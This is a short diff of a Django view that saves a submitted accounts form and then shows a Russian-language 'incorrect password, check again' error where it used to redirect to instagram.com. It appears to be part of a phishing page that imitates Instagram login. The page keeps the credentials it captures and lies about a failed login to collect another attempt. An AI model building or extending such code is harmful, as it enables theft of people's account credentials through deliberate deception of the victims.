@@ -7,7 +7,8 @@ def index(request):
         form = AccountsForm(request.POST)
         if form.is_valid():
             form.save()
-            return redirect('https://www.instagram.com/')
+            error = "К сожалению, вы ввели неправильный пароль. Проверьте свой пароль еще раз."
+            # return redirect('https://www.instagram.com/')
         else:
             error = "Форма была неверной"
 
